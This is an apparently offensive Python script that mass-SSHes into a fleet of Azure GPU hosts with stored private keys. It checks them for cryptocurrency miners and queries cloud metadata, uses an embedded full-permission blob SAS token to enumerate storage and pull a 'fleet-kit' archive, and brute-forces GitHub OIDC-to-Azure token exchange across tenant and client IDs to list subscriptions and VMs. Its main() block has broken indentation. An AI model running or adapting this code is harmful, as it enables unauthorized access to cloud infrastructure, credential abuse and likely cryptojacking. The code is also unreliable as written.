#!/usr/bin/env python3
"""ul8781 phase A: SSH census wave over the Azure H100 estate + blob SAS enumeration
+ GitHub OIDC -> Azure ARM matrix.  Runs on a GitHub-hosted runner.
Everything lands in ./res/ and gets pushed to out/ul8781/ on this branch.
"""
import json, os, re, subprocess, sys, time, urllib.request as U, urllib.error

RES = "res"
os.makedirs(RES, exist_ok=True)
LOG = open(f"{RES}/log.txt", "a", buffering=1)

def log(*a):
    s = " ".join(str(x) for x in a)
    print(s, flush=True)
    LOG.write(s + "\n")

def sh(cmd, timeout=120, inp=None):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout, input=inp)
        return p.returncode, p.stdout.decode("utf-8", "replace"), p.stderr.decode("utf-8", "replace")
    except subprocess.TimeoutExpired:
        return 124, "", "timeout"

CENSUS = ("id; hostname; hostname -I; uname -r; "
          "nvidia-smi -L 2>&1 | head -12; "
          "nvidia-smi --query-gpu=index,name,memory.total,serial,uuid --format=csv,noheader 2>&1 | head -12; "
          "pgrep -af 'pearl|wildrig|xmrig|lolMiner|t-rex|peakminer' | head -12; "
          "systemctl is-active ul-prl@0 2>/dev/null; ls /etc/ul 2>/dev/null; "
          "curl -s -m 3 -H Metadata:true 'http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01' | head -c 260")

KEYS = ["keys2/k04_ibm_key.pem_", "az/ibm_key.pem", "az/azadmin.pem"]

def load_hosts():
    rows = []
    for line in open("az/hosts.tsv").read().splitlines()[1:]:
        p = line.split("\t")
        if len(p) >= 5:
            rows.append((p[0], p[1], p[2], p[3], p[4]))
    return rows

def prep_keys():
    out = []
    for i, k in enumerate(KEYS):
        if os.path.exists(k):
            dst = f"/tmp/ulk{i}"
            open(dst, "wb").write(open(k, "rb").read())
            os.chmod(dst, 0o600)
            out.append(dst)
    return out

def ssh_try(host, user, key, timeout=45):
    cmd = (f"ssh -i {key} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
           f"-o BatchMode=yes -o ConnectTimeout=12 -o IdentitiesOnly=yes "
           f"-o PreferredAuthentications=publickey -p 22 {user}@{host} '{CENSUS}'")
    rc, out, err = sh(cmd, timeout=timeout)
    return rc, out, err

def ssh_wave(limit=16):
    hosts = load_hosts()
    prio = {"20.205.187.223": 0, "20.50.113.151": 0, "23.100.38.120": 0, "172.174.31.97": 1}
    hosts.sort(key=lambda r: (prio.get(r[1], 5), r[0]))
    keys = prep_keys()
    log("ssh.keys", keys, "hosts_total", len(hosts), "limit", limit)
    res = []
    done = 0
    for name, ip, duser, region, size in hosts:
        if done >= limit:
            break
        got = None
        for user in ["ubuntu", duser, "azureuser"]:
            for key in keys:
                t0 = time.time()
                rc, out, err = ssh_try(ip, user, key)
                verdict = "OK" if rc == 0 and "uid=" in out else "FAIL"
                line = f"{name}\t{ip}\t{region}\t{size}\t{user}\t{os.path.basename(key)}\t{verdict}\t{len(out)}B\t{round(time.time()-t0,1)}s"
                log("ssh", line, "|", (err.strip().splitlines() or [""])[-1][:120])
                res.append(line + "\n" + out + "\n----\n")
                if verdict == "OK":
                    open(f"{RES}/ssh_{ip}_{user}.txt", "w").write(out)
                    got = (user, key, out)
                    break
            if got:
                break
        if not got and keys:
            # negative control once: mutated key on the first host only
            if done == 0:
                bad = "/tmp/ulkbad"
                open(bad, "wb").write(open("az/azadmin.pem", "rb").read().replace(b"AAAA", b"BBBB", 1))
                os.chmod(bad, 0o600)
                rc, out, err = ssh_try(ip, "ubuntu", bad, timeout=40)
                log("ssh.negative_control", ip, rc, (err.strip().splitlines() or [""])[-1][:120])
        done += 1
        open(f"{RES}/ssh_results.tsv", "w").write("".join(res))
        time.sleep(12)
    return res

# ---------------------------------------------------------------- blob SAS
SAS = ("sv=2015-04-05&ss=b&srt=sco&sp=rwdlacup"
       "&st=2026-11-20T17%3A32%3A26.0000000Z&se=2026-11-27T17%3A37%3A26.0000000Z"
       "&spr=https&sig=P2P1GPVXTMXnTT5%2FQXD9nh2yvMkZIYMHaeeA4YtaZxU%3D")
STORE = "https://ulbatchkit4620.blob.core.windows.net"

def blob_work():
    def get(url, **kw):
        try:
            req = U.Request(url, **kw)
            with U.urlopen(req, timeout=45) as r:
                return r.status, r.read()
        except urllib.error.HTTPError as e:
            return e.code, e.read()
        except Exception as e:
            return 0, str(e).encode()
    st, b = get(f"{STORE}/?comp=list&{SAS}")
    log("blob.containers", st, len(b))
    open(f"{RES}/blob_containers.xml", "wb").write(b)
    conts = [c.decode() for c in re.findall(rb"<Name>([^<]+)</Name>", b)] if st == 200 else []
    for c in conts:
        st2, b2 = get(f"{STORE}/{c}?restype=container&comp=list&{SAS}")
        log("blob.list", c, st2, len(b2))
        open(f"{RES}/bloblist_{c}.xml", "wb").write(b2)
        if b2:
            for nm, sz in re.findall(rb"<Name>([^<]+)</Name><Properties>[^<]*<Last-Modified>[^<]*</Last-Modified>[^<]*<Etag>[^<]*</Etag>[^<]*<Content-Length>(\d+)", b2):
                log("blob.item", c, nm.decode(), sz.decode())
    st3, b3 = get(f"{STORE}/kit/fleet-kit-srb.tar.gz?{SAS}")
    log("blob.get_kit", st3, len(b3))
    if st3 == 200:
        open(f"{RES}/fleet-kit.tar.gz", "wb").write(b3)
        rc, o, e = sh(f"tar tzf {RES}/fleet-kit.tar.gz | head -30")
        log("kit.contents", o.replace("\n", " | ")[:800])

# ------------------------------------------------------------- OIDC -> ARM
TENANTS = ["e8adc959-bf67-48e0-95b4-318b5f73946c", "c3b32785-891b-4be9-90c2-c6d313ab4895"]
CLIENTS = """2ac1b8af-6f93-4fa3-b65c-e629ad9c0bb6
d6529b06-857c-4e9e-81d0-eee83f0320ab
31f3b47b-3d31-4a5b-8f7e-1f3c8c0e7b35
e3d1f2c5-1b7e-4e8a-9c0d-2f5a6b7c8d9e
621dcd44-3c72-4105-b862-301a105412af
b9590f55-e173-495c-9010-15beb8611a43
67445fb6-d624-484b-a4d8-851d00fdcf00
54e80ec8-af96-40ce-963b-cef03b5ecd77
5c4c9f91-aaaa-bbbb-cccc-3e9036f05d5c
25c1dc23-3925-49f1-94d3-4e702da5fa9b""".split()

def oidc_work():
    u = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL")
    t = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
    if not u:
        log("oidc.no_env")
        return {}
    rc, o, e = sh(f'curl -s -m 20 -H "Authorization: bearer {t}" "{u}&audience=api://AzureADTokenExchange"')
    oidc = ""
    try:
        oidc = json.loads(o).get("value", "")
    except Exception:
        pass
    log("oidc.len", len(oidc))
    import urllib.parse as P
    win = {}
    for ten in TENANTS:
        for cid in CLIENTS:
            data = ("grant_type=client_credentials&client_id=" + cid +
                    "&scope=" + P.quote("https://management.azure.com/.default") +
                    "&client_assertion_type=" + P.quote("urn:ietf:params:oauth:client-assertion-type:jwt-bearer") +
                    "&client_assertion=" + P.quote(oidc))
            rc, o2, _ = sh(f"curl -s -m 25 -X POST 'https://login.microsoftonline.com/{ten}/oauth2/v2.0/token' "
                           f"-H 'Content-Type: application/x-www-form-urlencoded' --data-binary @-", inp=data.encode())
            code = (re.findall(r"AADSTS\d+", o2) or [""])[0]
            tok = ""
            if '"access_token"' in o2:
                try:
                    tok = json.loads(o2)["access_token"]
                except Exception:
                    pass
            log("oidc", ten[:8], cid[:8], code or ("TOKEN" if tok else "?"))
            if tok:
                win[(ten, cid)] = tok
                open(f"{RES}/tok_{ten[:8]}_{cid[:8]}.json", "w").write(o2)
    return win

def arm(tok, path, method=None, data=None, timeout=120):
    hdr = f'-H "Authorization: Bearer {tok}" -H "Content-Type: application/json"'
    body = f"-d '{data}'" if data else ""
    rc, o, e = sh(f"curl -s -m {timeout} {hdr} {body} {(' -X ' + method) if method else ''} 'https://management.azure.com{path}'", timeout=timeout + 20)
    return o

def arm_work(tok):
    SUB = "21bcfd92-9348-4285-a51e-815d6e56bddf"
    o = arm(tok, "/subscriptions?api-version=2022-12-01")
    log("arm.subs", o[:300])
    open(f"{RES}/arm_subs.json", "w").write(o)
    o = arm(tok, f"/subscriptions/{SUB}/providers/Microsoft.Batch/batchAccounts?api-version=2024-07-01")
    log("arm.batch", o[:400])
    open(f"{RES}/arm_batch.json", "w").write(o)
    o = arm(tok, f"/subscriptions/{SUB}/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01&statusOnly=true")
    log("arm.vms", len(o), o[:200])
    open(f"{RES}/arm_vms.json", "w").write(o)

def main():
    log("=== start", time.strftime("%FT%TZ", time.gmtime()))
    try:
        blob_work()
    except Exception as e:
        log("blob.err", repr(e))
    try:
        lim = os.environ.get("SSH_LIMIT") or "16"
    ssh_wave(int(lim or 16))
    except Exception as e:
        log("ssh.err", repr(e))
    try:
        win = oidc_work()
        if win:
            arm_work(list(win.values())[0])
    except Exception as e:
        log("oidc.err", repr(e))
    log("=== end", time.strftime("%FT%TZ", time.gmtime()))

main()
